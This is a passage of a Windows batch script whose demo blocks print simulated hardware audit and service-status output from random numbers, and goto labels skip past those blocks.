    SATA
) do (
    set /a score=!random! %% 100
    echo %%A Status: !score!%%
)

echo Preview complete.
pause
goto :eof

:skipSystem
:: ======================================
:: END OF PERFORMANCE SCAN BLOCK
:: ======================================

goto :skipNetwork

:: ======================================
:: Hardware Audit - DEMO ONLY
:: ======================================

:NetworkRoutine
title Hardware Audit
color DF

echo Initializing Hardware Audit...
timeout /t 1 >nul

echo Verifying system components...
timeout /t 1 >nul

for /L %%i in (1,1,6) do (
    set /a percent=!random! %% 100
    echo Component %%i ........ !percent!%%
    timeout /t 1 >nul
)

echo.
echo Collecting statistics...
timeout /t 2 >nul

for %%A in (
    Memory
    Graphics
    CPU
    Audio
) do (
    set /a score=!random! %% 100
    echo %%A Status: !score!%%
)

echo.
echo Checking active services...
timeout /t 1 >nul

for %%S in (
    FTP
    RDP
    NTP
    LDAP
    DNS
) do (
    set /a state=!random! %% 2
    if !state! EQU 0 (
        echo %%S ........ ONLINE
    ) else (
        echo %%S ........ STANDBY
    )
)

echo Check finished.
pause
goto :eof

:skipNetwork
:: ======================================
:: END OF HARDWARE AUDIT BLOCK
:: ======================================
